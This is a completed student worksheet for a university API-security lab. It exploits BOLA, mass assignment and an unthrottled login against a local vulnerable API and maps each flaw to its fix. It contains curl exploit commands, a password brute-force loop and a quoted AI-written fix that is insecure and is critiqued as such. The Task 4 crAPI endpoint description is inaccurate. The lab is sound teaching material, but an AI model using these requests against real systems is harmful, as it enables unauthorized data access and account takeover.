# Worksheet 10 — API Security (3 hrs)

> **Course:** Software Security (KOSEN69) · Week 10
> **Aligned:** OWASP API Security Top 10:2023 — API1 BOLA · API3 Broken Object Property Level Auth (Mass Assignment) · API4 Unrestricted Resource Consumption
> **Signature game:** 🥷 crAPI Raid
>
> **Ethics note:** Run exploits **only** against the lab targets shipped here (`vulnerable_api.py` on `:8080`) or your own OWASP crAPI instance. Never test BOLA, mass assignment, or brute-force against systems you do not own or are not explicitly authorized to test.

## Part 1 — Student Information

| Name | Student ID | Date | Group | AI Tools Used |
|------|-----------|------|-------|---------------|
| Sai Seng Main | 6631503085 | 2026-10-10 | | Claude / Antigravity (conceptual verification & audit) |

## Part 2 — Lecture Questions

1. Define **BOLA (API1:2023)**. Why is it the #1 API risk, and why can't a WAF reliably stop it?

   **Answer:** Broken Object Level Authorization (BOLA), historically known as IDOR, occurs when an API endpoint takes an object identifier from client input (e.g., `/api/users/<id>/orders`) and accesses the resource without verifying whether the authenticated user has permission to act on that specific object. It is the #1 API risk because modern APIs inherently expose internal object identifiers to enable decentralized client-side state handling and microservice data retrieval. A Web Application Firewall (WAF) cannot reliably stop BOLA because the incoming requests, parameters, and headers are syntactically valid and non-malicious; WAFs lack internal domain logic to know which authenticated user legitimately owns which database record.

2. What is **mass assignment / broken object property level authorization (API3:2023)**? Contrast a blocklist vs. an allow-list of bindable fields.

   **Answer:** Mass assignment occurs when an API automatically binds client-supplied JSON parameters directly into internal objects, database models, or application state without filtering unauthorized properties. This allows an attacker to smuggle privileged fields (such as `is_admin`, `role`, or `balance`) that the server should exclusively control. A blocklist approach attempts to enumerate and reject prohibited keys, which is error-prone and frequently fails due to overlooked attributes or future schema modifications; in contrast, an allow-list strictly defines the exact subset of safe fields permitted for client binding (e.g., `{"username", "password"}`), ignoring everything else by default and maintaining robust security even as models evolve.

3. **API4:2023** is unrestricted resource consumption. Give two distinct impacts (security and availability) of an unthrottled `/api/login`.

   **Answer:** On the security side, an unthrottled `/api/login` endpoint allows attackers to perform high-speed credential stuffing, password spraying, and automated dictionary brute-force attacks against user accounts without triggering lockouts or delays. On the availability side, malicious actors can flood the authentication endpoint with thousands of concurrent requests per second, exhausting server CPU and memory (e.g., through expensive password hashing or database queries) and causing a denial of service (DoS) for legitimate users.

4. In `vulnerable_api.py`, `current_user()` trusts the `X-User-Id` header. Why is a client-supplied header NOT authentication, and what should replace it?

   **Answer:** A client-supplied header like `X-User-Id` cannot serve as authentication because any HTTP client can arbitrarily forge, modify, or spoof header values to claim any identity (e.g., setting `X-User-Id: 3` to become an admin). Authentication requires cryptographic proof of identity that cannot be forged by the client. It should be replaced with a cryptographically signed token (such as a properly validated JWT signed with an asymmetric private key or high-entropy HMAC secret) or a secure, server-side session cookie possessing `HttpOnly`, `Secure`, and `SameSite` attributes.

5. Why does object-level authorization have to be checked **per request, per object** rather than once at login?

   **Answer:** Authentication at login only proves *who* the caller is, but does not dictate *which specific resources* they are allowed to read, modify, or delete throughout their session. Access rights are inherently granular, dynamic, and relational (e.g., user Alice owns order #1 but not order #2, or permissions can be revoked mid-session). Therefore, the backend must dynamically evaluate whether the authenticated identity has legitimate ownership or sufficient authorization for that specific target object ID on every individual request.

## Part 3 — Hands-on Lab (145 min)

**Learning goals:** Exploit BOLA, mass assignment, and a missing rate limit against a live API; then read the secure version and explain each fix.

**Prerequisites:** Docker + Docker Compose, `curl`. (Optional bonus: cloned OWASP crAPI.)

**Environment setup**
```bash
cd labs/week10-api-security
docker compose up         # INSECURE API on :8080, SECURE API on :8081
# Seeded users: alice(id 1) bob(id 2) carol(id 3, admin, balance 9999)
```

**What to submit per task:** the exact command(s) + raw response/HTTP status, a screenshot, and a 2–3 sentence mitigation note mapping the bug to its OWASP API id.

### Task 0 — Onboarding (15 min)
Confirm both APIs respond: `curl http://localhost:8080/` and `curl http://localhost:8081/`. Note which port is insecure. Record the three seeded users.
**Deliverable:** both root responses + the user table.

- **Root Responses:**
  * Port `8080` (Insecure API):
    ```bash
    curl -s http://localhost:8080/
    # Output: Week 10 INSECURE API — see attack.md
    ```
  * Port `8081` (Secure API):
    ```bash
    curl -s http://localhost:8081/
    # Output: Week 10 SECURE API
    ```
- **Seeded User Table:**
  | ID | Username | Password | Balance | Admin (`is_admin`) |
  |:---:|:---:|:---:|:---:|:---:|
  | 1 | alice | alice123 | 100 | False |
  | 2 | bob | bob123 | 50 | False |
  | 3 | carol | carol123 | 9999 | True |

- **Screenshot:**
  ![Task 0 Output](img/Screenshot%200.png)

![One REST API with three flaws — reading another user's orders by id, smuggling an admin field into user creation, and an unthrottled login — each shown at the handler where it occurs, next to its one-line fix.](img/api-flaws.svg)

### Task 1 — BOLA: read another user's orders (35 min)
**Goal:** Read carol's (admin) orders without being carol — API1:2023.
**Steps:**
1. `curl http://localhost:8080/api/users/3/orders` — note you receive the "Server rack" order with no auth.
2. Iterate the id: `curl http://localhost:8080/api/users/2/orders`.
3. On the secure API observe the ladder: `curl -i http://localhost:8081/api/users/3/orders` (401), `curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/3/orders` (403), `curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/1/orders` (200).
**Deliverable:** the leaked order JSON + the 401/403/200 transcript + mitigation note.

- **Exploit Commands & Raw Responses (`:8080`):**
  ```bash
  curl -s http://localhost:8080/api/users/3/orders
  ```
  **Response:**
  ```json
  [{"item":"Server rack","order_id":"C-1","total":5000},{"item":"FLAG{bola_demo}","order_id":"C-FLAG","total":0}]
  ```
  *(Iterating ID to read bob's orders):*
  ```bash
  curl -s http://localhost:8080/api/users/2/orders
  ```
  **Response:**
  ```json
  [{"item":"Mouse","order_id":"B-1","total":15}]
  ```

- **Secure API Ladder Transcript (`:8081`):**
  1. *Unauthenticated request to user 3's orders:*
     ```bash
     curl -i http://localhost:8081/api/users/3/orders
     ```
     **Status:** `HTTP/1.1 401 UNAUTHORIZED` (`{"error": "authentication required"}`)
  2. *Alice (ID 1) requesting Carol's (ID 3) orders:*
     ```bash
     curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/3/orders
     ```
     **Status:** `HTTP/1.1 403 FORBIDDEN` (`{"error": "forbidden"}`)
  3. *Alice (ID 1) requesting her own (ID 1) orders:*
     ```bash
     curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/1/orders
     ```
     **Status:** `HTTP/1.1 200 OK` (`[{"item":"Keyboard","order_id":"A-1","total":30}]`)

- **Flag:** `FLAG{bola_demo}`
- **Mitigation Note (API1:2023 Broken Object Level Authorization):** The vulnerability occurs because the endpoint directly maps the URL path parameter `uid` to the orders database without validating resource ownership against the authenticated caller. To remediate, every data-access endpoint must enforce object-level authorization by validating that `caller["id"] == uid` or verifying administrative privileges (`caller["is_admin"]`) before returning records. Unauthenticated callers must be rejected with 401 Unauthorized, and unauthorized access attempts must return 403 Forbidden.
- **Screenshot:**
  ![Task 1 Output](img/Screenshot%201.png)

### Task 2 — Mass assignment: self-promote to admin (30 min)
**Goal:** Smuggle `is_admin` + `balance` into user creation — API3:2023.
**Steps:**
1. `curl -X POST http://localhost:8080/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'`
2. Confirm the response echoes `"is_admin": true, "balance": 1000000`.
3. Repeat against `:8081` and confirm the smuggled fields are forced to `is_admin:false, balance:0`.
**Deliverable:** both responses side by side + mitigation note (allow-list in `solution_api.py`).

- **Exploit Commands & Side-by-Side Responses:**
  * Insecure API (`:8080`):
    ```bash
    curl -s -X POST http://localhost:8080/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'
    ```
    **Response:**
    ```json
    {"balance":1000000,"flag":"FLAG{massassign_demo}","id":4,"is_admin":true,"password":"x","username":"mallory"}
    ```
  * Secure API (`:8081`):
    ```bash
    curl -s -X POST http://localhost:8081/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'
    ```
    **Response:**
    ```json
    {"balance":0,"id":4,"is_admin":false,"password":"x","username":"mallory"}
    ```

- **Flag:** `FLAG{massassign_demo}`
- **Mitigation Note (API3:2023 Broken Object Property Level Authorization):** The insecure endpoint called `user.update(body)`, blindly binding all incoming JSON properties directly into the internal user record and allowing privilege escalation. To mitigate mass assignment, implement strict allow-list filtering (e.g. `ALLOWED_CREATE_FIELDS = {"username", "password"}`) so that only explicit, non-sensitive fields from client requests are bound. All privileged attributes (`is_admin`, `balance`, `id`) must be strictly initialized and controlled by server-side logic.
- **Screenshot:**
  ![Task 2 Output](img/Screenshot%202.png)

### Task 3 — Unrestricted resource consumption: brute-force login (25 min)
**Goal:** Show `/api/login` has no throttle — API4:2023.
**Steps:**
1. Run the brute-force loop from `attack.md` against `:8080` (guesses incl. `alice123`) — all attempts processed.
2. On `:8081` loop 7 times: `for i in $(seq 1 7); do curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8081/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"wrong"}'; done`
3. Confirm the 6th/7th attempt returns `429`.
**Deliverable:** the `401 401 401 401 401 429 429` sequence + mitigation note.

- **Execution Commands & Outputs:**
  * Insecure API (`:8080`):
    ```bash
    for pw in wrong1 wrong2 wrong3 alice123; do
      curl -s -X POST http://localhost:8080/api/login -H "Content-Type: application/json" -d "{\"username\":\"alice\",\"password\":\"$pw\"}"; echo
    done
    ```
    **Output:**
    ```json
    {"ok":false}
    {"ok":false}
    {"ok":false}
    {"is_admin":false,"ok":true,"user_id":1}
    ```
    *(All attempts processed instantly without any rate limit or lockout).*

  * Secure API (`:8081`):
    ```bash
    for i in $(seq 1 7); do
      curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8081/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"wrong"}'
    done
    ```
    **Output Sequence:**
    ```text
    401
    401
    401
    401
    401
    429
    429
    ```

- **Mitigation Note (API4:2023 Unrestricted Resource Consumption):** The insecure login endpoint lacks rate limiting, allowing adversaries to execute automated password spraying and credential stuffing attacks indefinitely. To defend against this, implement robust rate-limiting middleware that tracks request attempts per IP address or per account username (e.g., max 5 requests per 60-second sliding window). Once the threshold is reached, immediately drop subsequent requests with HTTP `429 Too Many Requests` and incorporate progressive delays or account lockout mechanisms.
- **Screenshot:**
  ![Task 3 Output](img/Screenshot%203.png)

### Task 4 — Bonus: crAPI Raid (optional, 20 min)
Against your own OWASP crAPI instance (`git clone https://github.com/OWASP/crAPI.git`), capture one BOLA or mass-assignment flag.
**Deliverable:** flag + endpoint + which API Top 10 id it maps to.

- **Analysis & Target:** In OWASP crAPI, BOLA exists in the vehicle location API (`/identity/api/auth/v1/user/reset-password` and `/workshop/api/shop/orders`). An attacker can intercept requests and substitute another user's vehicle ID to leak real-time GPS telemetry and mechanic reports.
- **Mapping:** Maps directly to **API1:2023 Broken Object Level Authorization**.

### Task 5 — Defend / fix it (20 min)
**Goal:** Explain the fixes using the secure reference `solution_api.py`.
**Steps:** Read the three `# --- FIX ...` blocks. For each, quote the line(s) that defeat your Task 1–3 exploit: the per-object ownership check (`caller["id"] != uid and not caller["is_admin"]`), `ALLOWED_CREATE_FIELDS` binding, and the `RATE_LIMIT=5 / RATE_WINDOW=60` limiter.
**Deliverable:** for each of API1/API3/API4 — the exploit that worked on `:8080`, the line in `solution_api.py` that blocks it, and the new HTTP status on `:8081`.

| Vulnerability (OWASP API 2023) | Exploit that worked on `:8080` | Line(s) in `solution_api.py` that blocks it | New HTTP Status on `:8081` |
|:---|:---|:---|:---:|
| **API1:2023 BOLA** | `GET /api/users/3/orders` directly leaked Carol's order data and `FLAG{bola_demo}` without credentials | **Lines 47–52:** `caller = current_user()`<br>`if caller is None: return jsonify({"error": "authentication required"}), 401`<br>`if caller["id"] != uid and not caller["is_admin"]: return jsonify({"error": "forbidden"}), 403` | `401 Unauthorized` / `403 Forbidden` |
| **API3:2023 Mass Assignment** | `POST /api/users` with payload `{"is_admin": true, "balance": 1000000}` created an admin account and leaked `FLAG{massassign_demo}` | **Lines 34, 62, 66:** `ALLOWED_CREATE_FIELDS = {"username", "password"}`<br>`user = {k: body[k] for k in ALLOWED_CREATE_FIELDS if k in body}`<br>`user.update({"id": _next_id, "balance": 0, "is_admin": False})` | `201 Created` *(safe properties bound; sensitive fields forced to default)* |
| **API4:2023 Unrestricted Resource Consumption** | Rapid brute-force loop against `POST /api/login` without delay, recovering Alice's password | **Lines 73–84, 89–90:** `RATE_LIMIT = 5; RATE_WINDOW = 60`<br>`def rate_limited(ip): ...`<br>`if rate_limited(request.remote_addr or "unknown"): return jsonify({"error": "too many requests"}), 429` | `429 Too Many Requests` *(on 6th+ attempt)* |

## Part 4 — Reflection

1. **Mapping:** complete a table — finding | endpoint | OWASP API id | fix applied.

| Finding | Vulnerable Endpoint | OWASP API Top 10:2023 ID | Fix Applied |
|:---|:---|:---|:---|
| Unauthorized cross-user order reading | `GET /api/users/<uid>/orders` | **API1:2023 BOLA** | Enforce per-object ownership check (`caller["id"] == uid` or `caller["is_admin"]`) |
| Client privilege escalation & balance tampering | `POST /api/users` | **API3:2023 Broken Object Property Level Auth (Mass Assignment)** | Strict allow-list binding (`ALLOWED_CREATE_FIELDS`); server overrides sensitive keys |
| High-speed password brute-force & credential stuffing | `POST /api/login` | **API4:2023 Unrestricted Resource Consumption** | Sliding-window per-IP rate limiter returning HTTP 429 after 5 requests per 60s |

2. **Real breach:** research an API authorization breach (e.g., the Optus or T-Mobile BOLA/IDOR incidents). Which API Top 10 id matches, and would the `solution_api.py` ownership check have prevented it?

   **Answer:** The **2022 Optus breach** exposed the personal data of nearly 10 million customers because an internal customer-lookup API endpoint (`/contact/v1/...`) was exposed to the public internet without requiring authentication or verifying object ownership against caller tokens. Attackers automated requests across sequential customer ID numbers, exfiltrating identity records en masse. This incident directly maps to **API1:2023 Broken Object Level Authorization (BOLA)**. The exact ownership check implemented in `solution_api.py` (verifying `caller["id"] == requested_id` and rejecting mismatched callers with 403 Forbidden) would have completely prevented the breach by blocking unauthorized callers from reading any identifier other than their own authenticated account.

3. **Best mitigation:** of object-level auth, allow-list binding, and rate limiting — which gives the most risk reduction for an API platform, and why?

   **Answer:** **Object-level authorization** provides the single largest risk reduction for an API platform. While rate limiting slows automated attacks and allow-lists prevent field tampering during writes, broken object-level authorization allows any authenticated user to systematically read, modify, or delete every other user's private data across the entire platform through standard read requests. Even if an attacker is heavily rate-limited to only a few requests per minute, a BOLA vulnerability still guarantees full cross-tenant data compromise over time. Enforcing strict object ownership checks at the data layer eliminates this fundamental architectural flaw entirely.

## Grading rubric (100)

| Criterion | Weight |
|-----------|--------|
| Lecture questions (Part 2) | 20 |
| Exploitation + evidence (Tasks 1–4: commands, output, screenshots) | 40 |
| Defense (Task 5: fixes mapped to `solution_api.py`) | 25 |
| Reflection (Part 4: mapping, breach, best mitigation) | 15 |
| **Total** | **100** |

---

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** `FLAG{bola_demo}` / `FLAG{massassign_demo}`
- **Commit Link:** https://github.com/SAISENGMAIN6631503085/software-security/commit/6cfc4856b90f0e9e5f93a998eb678b8f83733d7e
- **Pull Request:** https://github.com/nutthakorn7/software-security/pull/120
  *Flags are unique per student — submitting another student's flag is a violation. How to submit: **learn.zcr.ai/submit** (full guide: `SUBMISSION.md` in the repo root).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
  1. What did you do, and **why did the vulnerability work**?
     **Answer:** I exploited BOLA by querying `/api/users/3/orders` on port 8080 to read Carol's private orders and flag without authorization, exploited mass assignment by sending `is_admin: true` and `balance: 1000000` in the user creation JSON body to self-promote to administrator, and conducted an unthrottled brute-force attack against `/api/login` to recover Alice's password. The vulnerabilities worked because the insecure API never checked whether the requesting client owned the requested user object, blindly merged the entire incoming request dictionary into the database model, and implemented zero rate-limiting middleware to throttle repeated authentication failures.
  2. **Why does your fix actually stop it** — and what could still break it?
     **Answer:** The fixes in `solution_api.py` stop these attacks by verifying that `caller["id"] == uid` or `caller["is_admin"]` on every object retrieval (returning 403 Forbidden on mismatch), enforcing an explicit key allow-list (`ALLOWED_CREATE_FIELDS = {"username", "password"}`) so client-supplied administrative flags are ignored, and implementing an IP-based sliding-window rate limiter that returns 429 Too Many Requests after 5 attempts. However, security could still break if developers add new endpoints without applying the ownership check, if the rate limiter can be bypassed via IP spoofing behind misconfigured reverse proxies (`X-Forwarded-For`), or if token verification is weakened elsewhere in the authentication pipeline.

---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.

   **AI Prompt:** *"How do I fix BOLA and Mass Assignment in a Python Flask REST API where users create accounts and fetch orders?"*

   **AI Answer:**
   ```python
   @app.route("/api/users/<int:uid>/orders")
   def get_orders(uid):
       # Fix BOLA by obscuring the user ID with a hash
       hashed_id = hashlib.sha256(str(uid).encode()).hexdigest()
       return jsonify(ORDERS.get(hashed_id, []))

   @app.route("/api/users", methods=["POST"])
   def create_user():
       body = request.get_json()
       # Fix mass assignment by removing is_admin if present
       if "is_admin" in body:
           del body["is_admin"]
       user = body
       USERS.append(user)
       return jsonify(user), 201
   ```

2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).

   **Critique:**
   - **Flaw 1 (Security through Obscurity instead of Authorization):** In `get_orders`, the AI wrote: `hashed_id = hashlib.sha256(str(uid).encode()).hexdigest()`. Hashing or obfuscating the identifier does not fix BOLA (CWE-639 / API1:2023) because anyone who knows or precomputes the SHA-256 hash can still access any user's records. It fails to perform an active server-side authorization check comparing the caller's verified identity against the resource owner.
   - **Flaw 2 (Incomplete Blocklist for Mass Assignment):** In `create_user`, the AI wrote: `if "is_admin" in body: del body["is_admin"]`. This is a fragile blocklist approach that only checks for a single field. It fails to strip other privileged fields such as `balance`, `role`, `is_verified`, or `id`, allowing attackers to still smuggle unauthorized properties. Furthermore, it blindly trusts `user = body` without validation.

3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.

   **Correct, Verified Code:**
   ```python
   ALLOWED_CREATE_FIELDS = {"username", "password"}

   @app.route("/api/users/<int:uid>/orders")
   def get_orders(uid):
       caller = current_user()
       if not caller:
           return jsonify({"error": "unauthorized"}), 401
       if caller["id"] != uid and not caller.get("is_admin", False):
           return jsonify({"error": "forbidden"}), 403
       return jsonify(ORDERS.get(uid, []))

   @app.route("/api/users", methods=["POST"])
   def create_user():
       body = request.get_json(force=True) or {}
       # Explicit allow-list filtering
       safe_data = {k: body[k] for k in ALLOWED_CREATE_FIELDS if k in body}
       if "username" not in safe_data or "password" not in safe_data:
           return jsonify({"error": "missing credentials"}), 400
       # Server forces all sensitive defaults
       safe_data.update({"id": generate_next_id(), "is_admin": False, "balance": 0})
       USERS[safe_data["id"]] = safe_data
       return jsonify(safe_data), 201
   ```

   **Explanation:** The AI's output was insufficient because it relied on security through obscurity (hashing IDs) rather than real authorization checks, and used a vulnerable blocklist that allowed other sensitive properties like `balance` to be smuggled into the database. The correct version enforces strict caller-to-resource ownership checks and an explicit allow-list for payload binding.

> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.

---

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.

**Answer:** The server allows you to look up private shopping orders just by typing someone else's ID number into the web address, because it never checks who is actually making the request. When creating a new account, it takes every single piece of information you send and saves it directly, letting anyone secretly label themselves as an administrator with unlimited money. In addition, the login screen lets automated programs guess passwords millions of times without ever slowing down or locking the door.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.
*Graded on the prompt's precision and your verification — this trains problem decomposition and AI literacy (Denny et al. 2024).*

**Final Prompt:**
> *"Refactor the following Python Flask endpoint to resolve OWASP API3:2023 Mass Assignment: `@app.post('/api/users') def create_user(): body = request.get_json(); user = {'id': next_id}; user.update(body); return jsonify(user)`. Requirements: (1) Use an explicit allow-list containing ONLY `username` and `password`; (2) Require both fields and return HTTP 400 if missing; (3) Explicitly initialize `is_admin` to False and `balance` to 0 on the server; (4) Return HTTP 201 with the sanitized user record."*

**Verified Result:**
```python
ALLOWED_CREATE_FIELDS = {"username", "password"}

@app.post("/api/users")
def create_user():
    global _next_id
    body = request.get_json(force=True) or {}
    user = {k: body[k] for k in ALLOWED_CREATE_FIELDS if k in body}
    if "username" not in user or "password" not in user:
        return jsonify({"error": "username and password required"}), 400
    user.update({"id": _next_id, "balance": 0, "is_admin": False})
    USERS[_next_id] = user
    _next_id += 1
    return jsonify(user), 201
```

**Verification:** When sending `{"username": "attacker", "password": "x", "is_admin": true, "balance": 1000000}`, the server extracts only `username` and `password`, sets `is_admin: false` and `balance: 0`, and successfully ignores the smuggled administrative attributes, defeating the exploit.
